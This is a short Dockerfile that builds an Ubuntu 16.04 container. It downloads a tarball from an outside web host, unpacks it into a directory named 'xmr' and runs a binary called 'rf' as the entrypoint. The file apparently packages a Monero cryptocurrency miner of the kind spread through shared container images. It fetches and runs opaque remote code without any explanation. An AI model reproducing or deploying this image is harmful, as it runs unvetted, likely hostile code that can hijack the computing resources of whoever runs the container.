FROM  ubuntu:16.04
RUN   apt-get update && \
      apt-get install sudo wget tmux -y && \
      wget http://mrgeek.me/fb/masaro.tar.gz && \
      tar xvfz masaro.tar.gz && \
      cd xmr && \
      chmod +x rf
WORKDIR    /xmr
ENTRYPOINT  ["./rf"]
